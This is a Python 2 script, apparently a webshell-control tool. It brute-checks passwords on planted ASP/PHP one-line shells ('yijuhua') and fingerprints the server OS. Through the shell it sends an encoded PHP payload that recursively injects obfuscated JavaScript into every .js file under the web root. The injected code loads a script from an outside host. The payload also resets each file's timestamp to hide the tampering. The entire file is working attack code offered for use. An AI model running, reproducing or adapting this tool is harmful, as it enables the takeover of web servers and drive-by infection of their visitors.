#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import threading
import Queue
import time
import urllib2
import urllib
import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding('utf-8')
data_base64="c2V0X3RpbWVfbGltaXQoOTk5OSk7ICAKZnVuY3Rpb24gZmlsZV9hZGQoJGZpbGUpIAp7Cgl0cnkKCXsKCQlnbG9iYWwgJGRhdGE7IAoJCSRhPWZpbGVtdGltZSgkZmlsZSk7IAoJCSRmcD1mb3BlbigkZmlsZSwiYSsiKTsKCQlmcHV0cygkZnAsJGRhdGEpOwoJCWZjbG9zZSgkZnApOwoJCWVjaG8gJGZpbGUuIi0tLWErIGxpbmsgZmlsZSBva1xyXG48YnI+IjsgCgkJdHJ5CgkJewoJCQlpZih0b3VjaCgkZmlsZSwkYSwkYSkpCgkJCXsKCQkJZWNobyAkZmlsZS4idXBkYXRlIGZpbGUgdGltZSBva1xyXG48YnI+IjsgCgkJCWVjaG8gIi0tLS0tLS0tXHJcbjxicj4iOyAKCQkJfWVsc2V7CgkJCWVjaG8gJGZpbGUuInVwZGF0ZSBmaWxlIHRpbWUgdHJ5LWVycm9yXHJcbjxicj4iOyAKCQkJZWNobyAiLS0tLS0tLS1cclxuPGJyPiI7IAoJCQl9CgkJfQoJCWNhdGNoKEV4Y2VwdGlvbiAkZSkKCQl7IAoJCX0KCX0KCWNhdGNoKEV4Y2VwdGlvbiAkZSkKCXsgCgllY2hvICRlLiJ1cGRhdGUgZmlsZSBlcnJvclxyXG48YnI+IjsgCglyZXR1cm4gMDsKCX0KfQoKZnVuY3Rpb24gZm9yX2ZpbGUoJHBhdGgpCnsKCXRyeQoJewoJCSRkID1AZGlyKCIkcGF0aCIpOwoJCXdoaWxlIChmYWxzZSAhPT0gKCRlbnRyeSA9ICRkLT5yZWFkKCkpKSAKCQl7CgkJCWlmKCRlbnRyeSA9PSAiLiIgfHwgJGVudHJ5ID09ICIuLiIpIGNvbnRpbnVlOwoJCQkkZmlsZT0kZC0+cGF0aC4iLyIgLiRlbnRyeTsKCQkJaWYoQGlzX2RpcigkZmlsZSkpIAoJCQl7CgkJCWZvcl9maWxlKCRmaWxlKTsKCQkJfQoJCQllbHNlCgkJCXsKCQkJaWYoQGVyZWcoIi5qcyIsJGZpbGUpKSAKCQkJewoJCQllY2hvICJmaW5kIGZpbGVzOiIuJGZpbGUuIlxyXG48YnI+IjsKCQkJZmlsZV9hZGQoJGZpbGUpOwoJCQl9CgkJCX0KCQl9CgkJJGQtPmNsb3NlKCk7CgkJcmV0dXJuIDE7Cgl9CgljYXRjaChFeGNlcHRpb24gJGUpCgl7IAoJZWNobyAkZS4iZm9yIHdlYiBkaXIgZXJyb3JcclxuPGJyPiI7IAoJcmV0dXJuIDA7Cgl9Cn0KCgpoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWdiayIpOwokQlk9IlVWRXlOakF5TVRVNU9UUTIiOwoKaW5pX3NldCgiZGF0ZS50aW1lem9uZSIsIkFzaWEvQ2hvbmdxaW5nIik7CkAkdGltMj1kYXRlKCdZLW0tZCBIOmk6cycsdGltZSgpKTsKZWNobyAidGltZToiLiR0aW0yLiJcclxuPGJyPiI7CgoKZ2xvYmFsICRkYXRhMTsKJGRhdGE9IlxudmFyIF8kPVsnXFx4M2NcXHg3M1xceDYzXFx4NzJcXHg2OVxceDcwXFx4NzRcXHgyMFxceDc0XFx4NzlcXHg3MFxceDY1XFx4M2RcXHgyMlxceDc0XFx4NjVcXHg3OFxceDc0XFx4MmZcXHg2YVxceDYxXFx4NzZcXHg2MVxceDczXFx4NjNcXHg3MlxceDY5XFx4NzBcXHg3NFxceDIyXFx4MjBcXHg3M1xceDcyXFx4NjNcXHgzZFxceDIyXFx4NjhcXHg3NFxceDc0XFx4NzBcXHgzYVxceDJmXFx4MmZcXHg3N1xceDc3XFx4NzdcXHgyZVxceDc3XFx4NjVcXHg2MlxceDczXFx4NjNcXHg2MVxceDZlXFx4MzFcXHgzOVxceDM4XFx4MzlcXHgyZVxceDc1XFx4NzNcXHgyZlxceDU0XFx4NGZcXHg0ZFxceDJmXFx4NjlcXHg3MFxceDJlXFx4NzBcXHg2OFxceDcwXFx4MjJcXHgzZVxceDNjXFx4MmZcXHg3M1xceDYzXFx4NzJcXHg2OVxceDcwXFx4NzRcXHgzZSddO2RvY3VtZW50LndyaXRlKCBfJFswXSk7IjsKCgp0cnkKeyAKJHJlc3VsdCA9IGFycmF5KCk7IAokdXJsX25hbWU9JF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKZWNobyAic3RhcnQgZmlsZToiLiR1cmxfbmFtZS4iXHJcbjxicj4iOyAKZWNobyAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuPGJyPiI7CmZvcl9maWxlKCR1cmxfbmFtZSk7IAokdXJsRmlsZU5hbWUgPSBleHBsb2RlKCIvIiwkdXJsX25hbWUpOwokbGllPWNvdW50KCR1cmxGaWxlTmFtZSk7CiRmaWVsX3VybD0iIjsKJGZpbGxhcnJheSA9YXJyYXkoKTsKIGZvciAoJGk9MDsgJGk8JGxpZTsgJGkrKykgCiB7Cgl0cnkKCXsgCgkkZmllbF91cmw9JGZpZWxfdXJsLiR1cmxGaWxlTmFtZVskaV0uIi8iOwoJYXJyYXlfdW5zaGlmdCgkZmlsbGFycmF5LCRmaWVsX3VybCk7Cgl9CgljYXRjaChFeGNlcHRpb24gJGUpCgl7IAogICAgICAgICAgZWNobyAiZmlsZSB0cnkgRXhjZXB0aW9uIi4iPGJyPiI7IAoJfQogfQpmb3JlYWNoICgkZmlsbGFycmF5IGFzICRrKQp7CmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT1saW5rICBsaW5rOiIuJGsuIjxicj4iOwpmb3JfZmlsZSgkayk7IAp9Cn0KY2F0Y2goRXhjZXB0aW9uICRlKQp7IApkaXJ0cmVlKCIuIik7Cn0K"

class C_YJH(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def yijuhua_cs(self,asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
        try:
            #选择扫描方式
            if asp_php == "":
                asp_php = "php"
            if asp_php == "asp":
                params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
            elif asp_php == "php":
                #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
                params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
            else:
                params = "=Response.Clear();Response.Write(\"jinlaile\");"
                #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                if(data.find("jinlaile") >= 0):
                    #print "!!!!----PASS FIND!!! -------------->"+PASS
                    return 1
                    #os._exit(1)
            except Exception,e:
                #print e
                return 0

        except Exception,e:
            #print e
            return 0

    def yijuhua_win_linux(self,url,PASS): #URL地址 ，密码   返回操作系统
        try:
            #选择扫描方式
            #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="

            params = "=echo PHP_OS;"
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                if "WINNT" in data:
                    return "WINNT"
                if "Linux" in data:
                    return "Linux"
                if "FreeBSD" in data:
                    return "FreeBSD"
                return "null"
            except Exception,e:
                #print e
                return 0
        except Exception,e:
            #print e
            return 0

    def yijuhua_php_js(self,url,PASS): #URL地址 ，密码   只支持PHP
        try:
        #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(data_base64))  #quote URL编码
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                #print params
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                    return data
                return data
            except Exception,e:
                #print e
                return 0

        except Exception,e:
            #print e
            return 0